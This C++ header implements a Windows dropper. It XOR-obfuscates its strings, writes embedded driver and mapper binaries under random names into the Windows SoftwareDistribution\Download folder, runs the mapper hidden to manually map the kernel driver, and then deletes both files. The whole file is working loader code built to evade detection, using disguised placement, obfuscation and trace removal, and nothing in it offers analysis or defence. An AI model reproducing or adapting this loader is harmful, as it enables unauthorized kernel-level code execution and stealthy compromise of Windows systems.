#pragma once
#include "shellcode.h"

#define patch_shell   xor_w(L"\\SoftwareDistribution\\Download\\")

#ifndef WAIT_OBJECT_TIME
#	define WAIT_OBJECT_TIME(ms) (ms * -10000)
#endif

SIZE_T random_number(SIZE_T Min, SIZE_T Max) {
	static mt19937 mt{ random_device{}() };
	uniform_int_distribution<SIZE_T> dist{ Min, Max };
	return dist(mt);
}

SIZE_T random_number(SIZE_T Max) {
	return random_number(0, Max);
}

SIZE_T random_number() {
	return random_number(0, numeric_limits<SIZE_T>::max());
}

string random_string()
{
	string str = xor_a("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890");
	string newstr;
	size_t pos;
	while (newstr.size() != 32)
	{
		pos = ((random_number() % (str.size() + 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}

wstring random_string_w()
{
	wstring str = xor_w(L"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890");
	wstring newstr;
	size_t pos;
	while (newstr.size() != 5)
	{
		pos = ((random_number() % (str.size() + 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}

wstring get_parent(const wstring& path)
{
	if (path.empty())
		return path;

	auto idx = path.rfind(L'\\');
	if (idx == path.npos)
		idx = path.rfind(L'/');

	if (idx != path.npos)
		return path.substr(0, idx);
	else
		return path;
}

wstring get_exe_directory()
{
	wchar_t imgName[MAX_PATH] = { 0 };
	DWORD len = ARRAYSIZE(imgName);
	QueryFullProcessImageNameW(GetCurrentProcess(), 0, imgName, &len);
	wstring sz_dir = (wstring(get_parent(imgName)) + xor_w(L"\\"));
	return sz_dir;
}

wstring get_files_directory()
{
	WCHAR system_dir[256];
	GetWindowsDirectoryW(system_dir, 256);
	wstring sz_dir = (wstring(system_dir) + xor_w(L"\\SoftwareDistribution\\Download\\"));
	return sz_dir;
}

wstring get_random_file_name_directory(wstring type_file)
{
	wstring sz_file = get_files_directory() + random_string_w() + type_file;
	return sz_file;
}

//void run_us_admin(std::wstring sz_exe, bool show)
//{
//	ShellExecuteW(NULL, xor_w(L"runas"), sz_exe.c_str(), NULL, NULL, show);
//}
//
//void run_us_admin_and_params(wstring sz_exe, wstring sz_params, bool show)
//{
//	ShellExecuteW(NULL, xor_w(L"runas"), sz_exe.c_str(), sz_params.c_str(), NULL, show);
//}

bool create_process(const wstring& FileName, const wstring& Command = {}, BOOL Wait = TRUE, BOOL NoWindow = FALSE) {
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOW siStartInfo;

	// Set up members of the PROCESS_INFORMATION structure.
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure.
	// This structure specifies the STDERR and STDOUT handles for redirection.
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFOW));
	siStartInfo.cb = sizeof(STARTUPINFOW);
	siStartInfo.hStdError = NULL;
	siStartInfo.hStdOutput = NULL;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
	siStartInfo.wShowWindow = SW_HIDE;

	auto fcmd = L"\""s + FileName + L"\" "s + Command;

	// Create the child process.
	auto createProcRes = CreateProcessW(
		NULL,                              // program name
		(LPWSTR)fcmd.c_str(),              // command line
		NULL,                              // process security attributes
		NULL,                              // primary thread security attributes
		TRUE,                              // handles are inherited
		(NoWindow ? CREATE_NO_WINDOW : 0), // creation flags (this is what hides the window)
		NULL,                              // use parent's environment
		NULL,                              // use parent's current directory
		&siStartInfo,                      // STARTUPINFO pointer
		&piProcInfo                        // receives PROCESS_INFORMATION
	);

	if (!createProcRes)
		return false;

	if (Wait) {
		LARGE_INTEGER waitTime;
		waitTime.QuadPart = WAIT_OBJECT_TIME(6000);
		NtWaitForSingleObject(piProcInfo.hProcess, FALSE, &waitTime);
	}

	NtClose(piProcInfo.hThread);
	NtClose(piProcInfo.hProcess);

	return true;
}


bool drop_mapper(wstring path)
{
	HANDLE h_file;
	BOOLEAN b_status = FALSE;
	DWORD byte = 0;

	h_file = CreateFileW(path.c_str(), GENERIC_ALL, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (GetLastError() == ERROR_FILE_EXISTS)
		return true;

	if (h_file == INVALID_HANDLE_VALUE)
		return false;

	b_status = WriteFile(h_file, shell_mapper, sizeof(shell_mapper), &byte, nullptr);
	CloseHandle(h_file);

	if (!b_status)
		return false;

	return true;
}

bool drop_driver(wstring path)
{
	HANDLE h_file;
	BOOLEAN b_status = FALSE;
	DWORD byte = 0;

	h_file = CreateFileW(path.c_str(), GENERIC_ALL, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (GetLastError() == ERROR_FILE_EXISTS)
		return true;

	if (h_file == INVALID_HANDLE_VALUE)
		return false;

	b_status = WriteFile(h_file, shell_driver, sizeof(shell_driver), &byte, nullptr);
	CloseHandle(h_file);

	if (!b_status)
		return false;

	return true;
}

wstring get_files_path()
{
	WCHAR system_dir[256];
	GetWindowsDirectoryW(system_dir, 256);
	return (wstring(system_dir) + patch_shell);
}

bool mmap_driver()
{
	bool result{};
	wstring sz_driver = get_random_file_name_directory(xor_w(L".sys"));
	wstring sz_mapper = get_random_file_name_directory(xor_w(L".exe"));
	wstring sz_params_map = xor_w(L"-map ") + sz_driver;

	DeleteFileW(sz_driver.c_str());
	DeleteFileW(sz_mapper.c_str());

	while (true) {
		if (!drop_driver(sz_driver))
			break;

		if (!drop_mapper(sz_mapper))
			break;

		if (!create_process(sz_mapper, sz_params_map))
			break;

		result = true;
		break;
	}

	DeleteFileW(sz_driver.c_str());
	DeleteFileW(sz_mapper.c_str());

	return result;
}

